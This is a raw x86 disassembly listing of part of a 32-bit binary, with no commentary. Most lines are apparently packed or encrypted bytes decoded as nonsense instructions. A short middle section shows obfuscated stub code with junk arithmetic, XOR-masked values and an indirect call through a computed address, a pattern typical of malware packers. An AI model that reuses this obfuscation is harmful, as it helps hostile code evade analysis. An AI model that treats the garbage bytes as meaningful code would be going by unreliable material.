  40ceea:	imul   edi,DWORD PTR [ebx],0x76
  40ceed:	out    dx,al
  40ceee:	and    al,BYTE PTR [ecx+0x45]
  40cef1:	stos   BYTE PTR es:[edi],al
  40cef2:	mov    eax,ds:0x3422fa94
  40cef7:	mov    DWORD PTR [ecx+0x7f9b894c],esp
  40cefd:	repz out 0x7d,eax
  40cf00:	in     eax,0xe3
  40cf02:	jmp    0x40ceda
  40cf04:	cmp    eax,0xb916d721
  40cf09:	add    BYTE PTR [edx+0x2722b5b1],ah
  40cf0f:	adc    al,0xcc
  40cf11:	in     al,0x2f
  40cf13:	xor    al,0x2d
  40cf15:	add    eax,0x9b0bc247
  40cf1a:	mov    ecx,0xabee4bcb
  40cf1f:	aas    
  40cf20:	lahf   
  40cf21:	loop   0x40cf8e
  40cf23:	cmp    DWORD PTR [edx+0x635a92f3],0x3e
  40cf2a:	arpl   ax,dx
  40cf2c:	fs adc cl,dl
  40cf2f:	pushf  
  40cf30:	xchg   ebp,eax
  40cf31:	scas   al,BYTE PTR es:[edi]
  40cf32:	mov    ebx,es
  40cf34:	test   eax,0x17794293
  40cf39:	add    DWORD PTR [ebp+0x7d1aedaf],esp
  40cf3f:	jae    0x40cf8e
  40cf41:	jp     0x40cf76
  40cf43:	shl    ah,1
  40cf45:	push   ebp
  40cf46:	outs   dx,DWORD PTR ds:[esi]
  40cf47:	popa   
  40cf48:	pop    di
  40cf4a:	fwait
  40cf4b:	je     0x40cfb7
  40cf4d:	fst    QWORD PTR [ebx]
  40cf4f:	nop
  40cf50:	imul   esp,edx,0xffffffc3
  40cf53:	add    DWORD PTR [eax-0x7f],ebp
  40cf56:	js     0x40cf7a
  40cf58:	hlt    
  40cf59:	add    al,0xa0
  40cf5b:	xlat   BYTE PTR ds:[ebx]
  40cf5c:	push   0xf69ed272
  40cf61:	xchg   esi,eax
  40cf62:	retf   0xea8d
  40cf65:	sub    eax,0x3e57240c
  40cf6a:	sub    DWORD PTR [edx],esp
  40cf6c:	xchg   BYTE PTR [ecx+edx*2+0x5ac2435b],ch
  40cf73:	hlt    
  40cf74:	and    al,0xb2
  40cf76:	mov    al,ds:0xc690ad32
  40cf7b:	xor    esi,DWORD PTR [ebp+0x47]
  40cf7e:	add    DWORD PTR [ebp-0x3c],0x1b
  40cf82:	dec    eax
  40cf83:	outs   dx,DWORD PTR ds:[esi]
  40cf84:	xchg   esi,eax
  40cf85:	xor    eax,0xd4a8afb5
  40cf8a:	les    ecx,FWORD PTR [ecx-0x33dc6390]
  40cf90:	push   eax
  40cf91:	(bad)  
  40cf93:	pop    eax
  40cf94:	aam    0xaa
  40cf96:	xor    DWORD PTR [ecx],edi
  40cf98:	inc    ebp
  40cf99:	pcmpgtw mm1,QWORD PTR [eax]
  40cf9c:	fwait
  40cf9d:	mov    ?,WORD PTR [edi+0x5c]
  40cfa0:	movzx  edi,WORD PTR [esi-0x11]
  40cfa4:	sub    dl,dh
  40cfa6:	cmc    
  40cfa7:	push   esp
  40cfa8:	les    ecx,FWORD PTR [ecx]
  40cfaa:	scas   eax,DWORD PTR es:[edi]
  40cfab:	pop    edi
  40cfac:	sbb    BYTE PTR [eax],dh
  40cfae:	pop    esp
  40cfaf:	push   ss
  40cfb0:	sbb    DWORD PTR [edi],0xffffffe8
  40cfb3:	cdq    
  40cfb4:	mov    edi,0x114520ec
  40cfb9:	or     al,0x3d
  40cfbb:	loopne 0x40cfdf
  40cfbd:	imul   ebx,DWORD PTR [eax],0x3e8b0ecb
  40cfc3:	out    0xc2,eax
  40cfc5:	std    
  40cfc6:	shr    BYTE PTR [eax+0x66],cl
  40cfc9:	jp     0x40cf93
  40cfcb:	push   edi
  40cfcc:	pop    ecx
  40cfcd:	vfmsubps ymm0,ymm0,YMMWORD PTR [ebx+0x56],ymm1
  40cfd4:	jno    0x40d04a
  40cfd6:	les    eax,FWORD PTR [esi+0x368de332]
  40cfdc:	dec    edi
  40cfdd:	mov    esi,0x6d6ea9a6
  40cfe2:	lods   al,BYTE PTR ds:[esi]
  40cfe3:	cmp    cl,ah
  40cfe5:	ss jmp 0x5e87ed94
  40cfeb:	dec    ebp
  40cfec:	and    al,0x81
  40cfee:	pusha  
  40cfef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cff0:	adc    ch,BYTE PTR [edi+0x63da4636]
  40cff6:	jbe    0x40cff3
  40cff8:	stos   BYTE PTR es:[edi],al
  40cff9:	sbb    dh,al
  40cffb:	jg     0x40cfad
  40cffd:	out    0xa1,eax
  40cfff:	pop    ecx
  40d000:	push   0xffffff8b
  40d002:	(bad)  
  40d003:	in     al,dx
  40d004:	pusha  
  40d005:	sub    ebx,edx
  40d007:	or     DWORD PTR [ebx+0x77],0xffffffff
  40d00b:	ret    0x16fe
  40d00e:	ja     0x40cfd1
  40d010:	mov    esi,0x52d77c8b
  40d015:	mov    ebx,0x50844365
  40d01a:	pop    esp
  40d01b:	test   DWORD PTR [esi+0x6e18c61a],0x218d6fe9
  40d025:	outs   dx,DWORD PTR ds:[esi]
  40d026:	aam    0x3
  40d028:	dec    ecx
  40d029:	dec    edi
  40d02a:	xor    eax,0x2492c8b2
  40d02f:	dec    eax
  40d030:	addr16 (bad) 
  40d032:	shl    BYTE PTR [eax-0x51],0x2
  40d036:	mov    dh,BYTE PTR [edx+0x6a91a8a4]
  40d03c:	inc    eax
  40d03d:	arpl   WORD PTR [edi+ebx*1-0x37],si
  40d041:	mov    ds:0xde6e11bc,eax
  40d046:	and    esp,DWORD PTR [edi+0x32faa858]
  40d04c:	push   ss
  40d04d:	stos   DWORD PTR es:[edi],eax
  40d04e:	pop    esi
  40d04f:	push   ebp
  40d050:	and    ch,BYTE PTR [edx+eiz*8+0x1ba43a4b]
  40d057:	sub    eax,0x7d7a0085
  40d05c:	lock js 0x40d029
  40d05f:	fld    QWORD PTR [edx+0x66]
  40d062:	push   ss
  40d063:	cmp    eax,0x715948c8
  40d068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d069:	push   ss
  40d06a:	out    0x10,al
  40d06c:	mov    dh,BYTE PTR [ecx]
  40d06e:	retf   
  40d06f:	jmp    0x53efa934
  40d074:	jl     0x40d0bd
  40d076:	xchg   ebx,eax
  40d077:	add    BYTE PTR [ebx],0x8f
  40d07a:	add    bl,al
  40d07c:	jbe    0x40d091
  40d07e:	inc    ecx
  40d07f:	mov    ch,0xc4
  40d081:	mov    bl,0xd0
  40d083:	inc    edi
  40d084:	stc    
  40d085:	ins    BYTE PTR es:[edi],dx
  40d086:	mov    fs,WORD PTR [eax+0x5562e3f9]
  40d08c:	(bad)  
  40d08d:	and    eax,0x1bc0385e
  40d092:	push   ebx
  40d093:	pop    eax
  40d094:	sub    esi,eax
  40d096:	xchg   ebp,eax
  40d097:	adc    ch,ch
  40d099:	ds pop ss
  40d09b:	push   ecx
  40d09c:	gs stos BYTE PTR es:[edi],al
  40d09e:	pushf  
  40d09f:	das    
  40d0a0:	lahf   
  40d0a1:	div    BYTE PTR [ebp+0x884680e]
  40d0a7:	fsub   QWORD PTR [ebp+0x4b]
  40d0aa:	mov    es,WORD PTR [ecx-0x58]
  40d0ad:	push   ds
  40d0ae:	xor    al,BYTE PTR [ecx-0x6]
  40d0b1:	or     DWORD PTR [ebx-0x36],0x67c98229
  40d0b8:	dec    edx
  40d0b9:	push   ebx
  40d0ba:	(bad)
  40d0bd:	mov    edi,ecx
  40d0bf:	scas   eax,DWORD PTR es:[edi]
  40d0c0:	out    dx,eax
  40d0c1:	rcl    DWORD PTR [ebp-0x27],cl
  40d0c4:	imul   ebp,edi,0xb
  40d0c7:	xchg   DWORD PTR [ecx],edx
  40d0c9:	idiv   BYTE PTR [ecx]
  40d0cb:	rcl    DWORD PTR [ebx+0x4ddf94bd],0x14
  40d0d2:	or     BYTE PTR [edx],0x78
  40d0d5:	ins    BYTE PTR es:[edi],dx
  40d0d6:	add    BYTE PTR [ebp*8+0x53bd5c7b],dh
  40d0dd:	mov    eax,ds:0xf8867cd4
  40d0e2:	and    DWORD PTR [edi],edx
  40d0e4:	es call 0x8fcce391
  40d0ea:	mov    ds:0x5bc3d822,al
  40d0ef:	(bad)  
  40d0f1:	sub    eax,0xbd43b15e
  40d0f6:	mov    ds:0x72573934,al
  40d0fb:	rcr    ecx,cl
  40d0fd:	mov    ah,0x63
  40d0ff:	and    al,BYTE PTR [edx-0x71]
  40d102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d103:	out    dx,eax
  40d104:	call   0xb8b4:0xa5fc9933
  40d10b:	fsubr  QWORD PTR [esp+esi*8-0x187a8216]
  40d112:	into   
  40d113:	out    0x48,eax
  40d115:	lahf   
  40d116:	icebp  
  40d117:	mov    ebx,0x5d309ede
  40d11c:	add    eax,0x358c747a
  40d121:	and    DWORD PTR [ebx+eiz*4-0x30b57ace],esp
  40d128:	ret    
  40d129:	push   esp
  40d12a:	jg     0x40d0d5
  40d12c:	out    dx,al
  40d12d:	push   edx
  40d12e:	mov    ebp,0xbd47269
  40d133:	pcmpgtw mm3,QWORD PTR [ebp-0x3a354a30]
  40d13a:	inc    edi
  40d13b:	sub    al,0xe4
  40d13d:	push   ebx
  40d13e:	add    DWORD PTR [edi],edi
  40d140:	ret    0xca68
  40d143:	mov    dl,bh
  40d145:	leave  
  40d146:	and    eax,eax
  40d148:	add    eax,DWORD PTR [edi]
  40d14a:	aaa    
  40d14b:	xor    al,ch
  40d14d:	mov    eax,ds:0x3c9b6db0
  40d152:	aam    0xb3
  40d154:	les    ebp,FWORD PTR [eax]
  40d156:	pop    esp
  40d157:	iret   
  40d158:	xor    DWORD PTR [esi+0x5b19e08c],ebp
  40d15e:	jge    0x40d194
  40d160:	push   ebx
  40d161:	ins    DWORD PTR es:[edi],dx
  40d162:	or     ebx,edi
  40d164:	fwait
  40d165:	pop    ebp
  40d166:	push   esi
  40d167:	nop
  40d168:	rcr    DWORD PTR [ecx-0x24f62145],cl
  40d16e:	daa    
  40d16f:	gs pop edi
  40d171:	mov    bh,0x46
  40d173:	dec    esi
  40d174:	mov    ah,0xca
  40d176:	fcmovnb st,st(2)
  40d178:	outs   dx,BYTE PTR ds:[esi]
  40d179:	pop    ss
  40d17a:	cmp    esi,DWORD PTR [ebx+0x5f538e60]
  40d180:	or     BYTE PTR [edx],bl
  40d182:	xchg   ecx,eax
  40d183:	out    dx,al
  40d184:	aad    0x60
  40d186:	xlat   BYTE PTR ds:[ebx]
  40d187:	xchg   ecx,eax
  40d188:	das    
  40d189:	neg    DWORD PTR [edx+0x3f]
  40d18c:	sbb    dh,BYTE PTR [ebp+0x128fdd1f]
  40d192:	cmp    eax,0xcbee5775
  40d197:	jmp    0x20fe:0xc2d4075d
  40d19e:	not    DWORD PTR [edi]
  40d1a0:	out    dx,al
  40d1a1:	jg     0x40d184
  40d1a3:	push   edi
  40d1a4:	push   ebx
  40d1a5:	or     bl,ah
  40d1a7:	adc    ecx,DWORD PTR [edx+ebx*8+0x79]
  40d1ab:	jo     0x40d1c1
  40d1ad:	dec    esp
  40d1ae:	fsubr  DWORD PTR ds:0x9ab9e958
  40d1b4:	pop    ecx
  40d1b5:	(bad)  
  40d1b6:	retf   0xaaf0
  40d1b9:	fstp   DWORD PTR [esp+edx*8-0x5496f8f6]
  40d1c0:	mov    bl,0xe5
  40d1c2:	aas    
  40d1c3:	fs call 0x7beee9cc
  40d1c9:	sub    dh,BYTE PTR [ebp+0x67b3cf31]
  40d1cf:	stos   BYTE PTR es:[edi],al
  40d1d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1d1:	js     0x40d184
  40d1d3:	mov    ds:0x4ba9cb8f,eax
  40d1d8:	test   eax,0x7d649c19
  40d1dd:	mov    ebp,0xafeaa91e
  40d1e2:	outs   dx,BYTE PTR ds:[esi]
  40d1e3:	fidiv  WORD PTR [ecx-0x37]
  40d1e6:	jecxz  0x40d212
  40d1e8:	scas   eax,DWORD PTR es:[edi]
  40d1e9:	jb     0x40d1c6
  40d1eb:	jl     0x40d235
  40d1ed:	dec    esp
  40d1ee:	push   ebx
  40d1ef:	mov    al,0x9e
  40d1f1:	add    dl,BYTE PTR [ecx-0x3fae3e4b]
  40d1f7:	jge    0x40d1bb
  40d1f9:	sar    BYTE PTR [esi+0x6d929314],0x90
  40d200:	inc    edx
  40d201:	lods   eax,DWORD PTR ds:[esi]
  40d202:	jp     0x40d280
  40d204:	mov    al,ds:0x7126de95
  40d209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d20a:	pusha  
  40d20b:	leave  
  40d20c:	enter  0x6c02,0xeb
  40d210:	stos   DWORD PTR es:[edi],eax
  40d211:	hlt    
  40d212:	or     BYTE PTR [edi-0x36da2c52],0x50
  40d219:	retf   
  40d21a:	test   BYTE PTR [edi+0x66],al
  40d21d:	mov    eax,0xe0b32912
  40d222:	sahf   
  40d223:	xchg   esp,eax
  40d224:	enter  0xf2df,0x80
  40d228:	mov    bl,0xd2
  40d22a:	out    0x4f,eax
  40d22c:	out    0x20,eax
  40d22e:	int3   
  40d22f:	and    DWORD PTR [esi+0x20ddb5a5],ecx
  40d235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d236:	arpl   WORD PTR [esi-0x2e83134e],si
  40d23c:	retf   
  40d23d:	adc    BYTE PTR [ecx-0x68],al
  40d240:	xchg   esp,eax
  40d241:	es or  eax,0xb15763d
  40d247:	inc    edi
  40d248:	rcr    DWORD PTR [ebx*4-0x77743577],1
  40d24f:	add    cl,BYTE PTR [ebx]
  40d251:	repz and esp,DWORD PTR [edi]
  40d254:	mov    esi,0x22f71e24
  40d259:	add    DWORD PTR [edi],edi
  40d25b:	mov    ebp,0xf84e434e
  40d260:	ins    BYTE PTR es:[edi],dx
  40d261:	push   eax
  40d262:	pop    edx
  40d263:	jbe    0x40d2de
  40d265:	aad    0x3e
  40d267:	fdivr  st,st(0)
  40d269:	cmp    esp,DWORD PTR [ebx+ebp*1-0xc]
  40d26d:	mov    es,esi
  40d26f:	dec    edi
  40d270:	jno    0x40d23d
  40d272:	mov    al,ds:0x80b143b7
  40d277:	cli    
  40d278:	and    esi,DWORD PTR [eax]
  40d27a:	ja     0x40d26e
  40d27c:	(bad)  
  40d27d:	sbb    eax,0x5b5bf461
  40d282:	in     al,dx
  40d283:	dec    ebp
  40d284:	fimul  WORD PTR [edx-0x5f2c3f0]
  40d28a:	cwde   
  40d28b:	sbb    bh,dl
  40d28d:	push   cs
  40d28e:	pop    ebp
  40d28f:	adc    BYTE PTR [ebp-0x3a],0x4d
  40d293:	outs   dx,DWORD PTR ds:[esi]
  40d294:	ds sub ecx,esi
  40d297:	outs   dx,DWORD PTR ds:[esi]
  40d298:	mov    eax,DWORD PTR [ebp-0x1c]
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x42fa2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d440
  40d43c:	ja     0x40d3cf
  40d43e:	out    0x1a,eax
  40d440:	sub    bh,BYTE PTR [ebx+0x7b]
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	leave  
  40d448:	sbb    BYTE PTR [esi-0x79],0xec
  40d44c:	ret    
  40d44d:	test   eax,0xa3bbe633
  40d452:	dec    edi
  40d453:	push   esi
  40d454:	fcom   QWORD PTR [esp+eax*4+0x11]
  40d458:	imul   esp,DWORD PTR [ecx],0xf9326c96
  40d45e:	push   0x25d517d3
  40d463:	popf   
  40d464:	pushf  
  40d465:	mov    BYTE PTR [edi+0x21],bl
  40d468:	sbb    eax,DWORD PTR [esi+eax*4+0x66]
  40d46c:	leave  
  40d46d:	mov    al,0x35
  40d46f:	dec    esi
  40d470:	xor    DWORD PTR [esi+0x75],0xffffffb5
  40d474:	adc    bl,bh
  40d476:	xchg   ebp,eax
  40d477:	adc    ah,BYTE PTR [edx]
  40d479:	mov    BYTE PTR [ebx-0x17e0ea21],0x89
  40d480:	mov    bh,0x3
  40d482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d483:	cmp    eax,0xe5d8e4a1
  40d488:	adc    ecx,DWORD PTR [ebx-0x73]
  40d48b:	cmp    dh,bl
  40d48d:	push   es
  40d48e:	add    ch,BYTE PTR [esi+0x28d753eb]
  40d494:	dec    edi
  40d495:	dec    eax
  40d496:	fwait
  40d497:	or     al,0x19
  40d499:	add    BYTE PTR [ecx-0x1b],0x6f
  40d49d:	or     BYTE PTR [edx+0x67],bh
  40d4a0:	pop    esi
  40d4a1:	icebp  
  40d4a2:	mov    esp,0xf65efb88
  40d4a7:	sahf   
  40d4a8:	jg     0x40d474
  40d4aa:	pop    ebx
  40d4ab:	fstp   TBYTE PTR [edi+0x75]
  40d4ae:	sub    eax,0xb5442c2c
  40d4b3:	(bad)  
  40d4b6:	mov    cl,0xd9
  40d4b8:	(bad)  
  40d4b9:	adc    dh,BYTE PTR [esp+edx*1-0x64]
  40d4bd:	dec    edi
  40d4be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4bf:	lods   al,BYTE PTR ds:[esi]
  40d4c0:	(bad)  
  40d4c1:	std    
  40d4c2:	sahf   
  40d4c3:	out    0xf9,eax
  40d4c5:	and    eax,0xb85a74a9
  40d4ca:	into   
  40d4cb:	dec    edx
  40d4cc:	fst    QWORD PTR [ecx+ecx*8-0x41]
  40d4d0:	dec    edi
  40d4d1:	or     al,0x15
  40d4d3:	jb     0x40d4b4
  40d4d5:	ins    BYTE PTR es:[edi],dx
  40d4d6:	and    bl,BYTE PTR [edi+0x672fae7]
  40d4dc:	and    BYTE PTR [ebp-0x22],ch
  40d4df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4e0:	xor    ecx,DWORD PTR [ebx+0x23579e09]
  40d4e6:	xor    dh,BYTE PTR [ecx+eiz*8]
  40d4e9:	mov    al,0x56
  40d4eb:	test   al,0xfa
  40d4ed:	push   edi
  40d4ee:	mov    eax,0xc9901b4b
  40d4f3:	sub    ebp,DWORD PTR [ecx-0x5f4586db]
  40d4f9:	cs ret 
  40d4fb:	test   edx,edx
  40d4fd:	clc    
  40d4fe:	jb     0x40d4f0
  40d500:	sti    
  40d501:	imul   ecx,DWORD PTR [esi-0x3],0x20a05f26
  40d508:	cmp    eax,0x88c231bb
  40d50d:	and    eax,0xe319ea13
  40d512:	bound  edi,QWORD PTR [edx]
  40d514:	jmp    0x5007:0x22d5d43b
  40d51b:	(bad)  
  40d51c:	xor    BYTE PTR [ecx+0x6063c7d0],al
  40d522:	imul   ebx,DWORD PTR [ebx+0x11],0x30
  40d526:	aad    0x35
  40d528:	not    DWORD PTR [eax]
  40d52a:	inc    ebx
  40d52b:	xor    DWORD PTR [ebx-0x68],0xc41e91f6
  40d532:	xor    DWORD PTR [eax],edi
  40d534:	pop    ebp
  40d535:	or     dh,BYTE PTR [edx-0x47]
  40d538:	outs   dx,DWORD PTR ds:[esi]
  40d539:	retf   0xc7f
  40d53c:	aas    
  40d53d:	mul    BYTE PTR [esi-0x44528547]
  40d543:	(bad)  
  40d544:	out    0x5,al
  40d546:	dec    edx
  40d547:	div    BYTE PTR [edx]
  40d549:	or     BYTE PTR [esi-0x33e75f6b],bh
  40d54f:	add    DWORD PTR ss:[ebx],0xe02c70e0
  40d556:	push   0xb6655438
  40d55b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d55c:	jmp    0x2f1:0x981441ef
  40d563:	js     0x40d543
  40d565:	push   0x17
  40d567:	call   0xe51b:0x793afd4c
  40d56e:	xor    cl,al
  40d570:	repnz lods al,BYTE PTR ds:[esi]
  40d572:	aas    
  40d573:	push   esp
  40d574:	sbb    eax,DWORD PTR [ecx]
  40d576:	in     al,dx
  40d577:	into   
  40d578:	cld    
  40d579:	add    bl,BYTE PTR [edi-0xb]
  40d57c:	ror    BYTE PTR [ebx],cl
  40d57e:	rol    DWORD PTR [ecx],cl
  40d580:	popa   
  40d581:	cwde   
  40d582:	adc    edx,edi
  40d584:	add    bl,dl
  40d586:	mov    ah,0x1d
  40d588:	push   ebp
  40d589:	mov    dl,0xf8
  40d58b:	cmp    BYTE PTR [ecx+ebp*4-0x7f],0x34
  40d590:	xor    BYTE PTR [esi],cl
  40d592:	xor    al,0x84
  40d595:	mov    ebp,0xb0f4015f
  40d59a:	shl    DWORD PTR [esi+0x4f],1
  40d59d:	cld    
  40d59e:	cmp    eax,0x27508312
  40d5a3:	cmp    BYTE PTR [esi+0x1f],al
  40d5a6:	gs pop ebp
  40d5a8:	xor    esp,0x75
  40d5ab:	not    BYTE PTR [ecx]
  40d5ad:	ret    
  40d5ae:	pusha  
  40d5af:	(bad)
  40d5b2:	in     al,dx
  40d5b3:	jbe    0x40d5a7
  40d5b5:	xchg   edx,eax
  40d5b6:	pop    edx
  40d5b7:	dec    ecx
  40d5b8:	call   0x9737:0x69f1afbb
  40d5bf:	push   ss
  40d5c0:	in     al,dx
  40d5c1:	rcl    ah,1
  40d5c3:	mov    ah,0x9f
  40d5c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5c6:	fwait
  40d5c7:	jae    0x40d584
  40d5c9:	and    DWORD PTR [esi+0x48],ecx
  40d5cc:	ds mov bh,0x5b
  40d5cf:	xchg   dh,dl
  40d5d1:	bound  ecx,QWORD PTR [esi+0x98b65d2]
  40d5d7:	xor    ebp,DWORD PTR [esi+0x7d367fe3]
  40d5dd:	adc    eax,0xa3bea074
  40d5e2:	xchg   esi,eax
  40d5e3:	call   0x265:0x9db44a7d
  40d5ea:	mov    al,ds:0xd5e3fd10
  40d5ef:	pop    eax
  40d5f0:	mov    al,0xb9
  40d5f2:	jbe    0x40d637
  40d5f4:	sbb    DWORD PTR [ebx],edi
  40d5f6:	pop    esi
  40d5f7:	scas   al,BYTE PTR es:[edi]
  40d5f8:	sbb    DWORD PTR [esp+ecx*8-0x1805c9a1],esp
  40d5ff:	xor    DWORD PTR [ecx],eax
  40d601:	or     eax,0xc5c262a8
  40d606:	fldenv [ebx+edx*2]
  40d609:	cmp    BYTE PTR [ebx+0x58aeac18],0xe7
  40d610:	dec    edx
  40d611:	in     eax,0x52
  40d613:	(bad)  
  40d615:	pop    ebx
  40d616:	test   DWORD PTR [edx+0x15],0x4afba44e
  40d61d:	nop    eax
  40d620:	les    ebp,FWORD PTR [ebx+0x1138b22c]
  40d626:	xor    ah,0xf4
  40d629:	sub    ebp,DWORD PTR [ebx-0x4b767aa]
  40d62f:	shl    DWORD PTR [edi],1
  40d631:	push   0xd0fbb058
  40d636:	fnsave [edi+0xb57621c]
  40d63c:	sbb    ecx,0x6652ee48
  40d642:	sar    DWORD PTR [ebx+eax*4+0x3f938065],cl
  40d649:	adc    edi,0x13302879
  40d64f:	lods   eax,DWORD PTR ds:[esi]
  40d650:	xor    BYTE PTR [edx],al
  40d652:	mov    WORD PTR [ecx-0x1247cf1a],gs
  40d658:	add    edx,ecx
  40d65a:	data16 jl 0x40d68a
  40d65d:	and    DWORD PTR [ecx-0x7b87f4c1],esp
  40d663:	clc    
  40d664:	dec    esp
  40d665:	push   esp
  40d666:	jnp    0x40d661
  40d668:	fidivr DWORD PTR [esi+0x65ddb54a]
  40d66e:	xchg   esp,eax
  40d66f:	xor    DWORD PTR [edi+edx*2+0x13],edx
  40d673:	and    eax,0x837d13a8
  40d678:	fidivr WORD PTR [eax+0x70f9f8a8]
  40d67e:	loope  0x40d626
  40d680:	inc    edx
  40d681:	rep ins BYTE PTR es:[edi],dx
  40d683:	gs ds retf 0xfc6b
  40d688:	mov    ?,WORD PTR [ecx]
  40d68a:	jns    0x40d667
  40d68c:	std    
  40d68d:	imul   ebp,DWORD PTR ds:0x33948341,0x22624ce1
  40d697:	rol    DWORD PTR [ebp+0x3d820d59],1
  40d69d:	cdq    
  40d69e:	pop    ebx
  40d69f:	in     al,0x4b
